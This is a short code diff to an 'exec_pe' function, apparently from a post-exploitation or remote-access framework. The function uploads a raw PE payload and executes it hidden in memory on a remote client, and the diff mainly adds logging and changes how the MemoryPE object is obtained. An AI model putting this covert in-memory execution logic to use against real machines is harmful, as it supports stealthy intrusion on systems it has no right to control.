@@ -62,13 +62,24 @@ def exec_pe(
     if not hasattr(module, 'mp'):
         setattr(module, 'mp', None)
 
-    mp = module.client.conn.modules[
-        'pupwinutils.memexec'
-    ].MemoryPE(
+    MemoryPE = module.client.remote(
+        'pupwinutils.memexec', 'MemoryPE', False
+    )
+
+    module.info(
+        'Upload payload and create context with: '
+        'args={} raw_pe={} suspended_process={} dupHandle={}'.format(
+            prog_args, type(raw_pe), suspended_process, dupHandle
+        )
+    )
+
+    mp = MemoryPE(
         raw_pe, args=prog_args, hidden=True,
         suspended_process=suspended_process,
         dupHandle=dupHandle
     )
+
+    module.info('Context created')
 
     module.mp = mp
     complete = threading.Event()
@@ -87,6 +98,7 @@ def exec_pe(
             mp.close
         )
 
+        module.info('Executing payload (interactive)')
         if mp.execute(complete.set, repl._con_write):
             complete.wait()
             mp.close()
@@ -100,6 +112,7 @@ def exec_pe(
             complete.set()
             module.error('Launch failed. Press ENTER')
     else:
+        module.info('Executing payload')
         pid = mp.execute(complete.set, module.log)
         if pid:
             module.success('[Process launched: PID={}]'.format(pid))
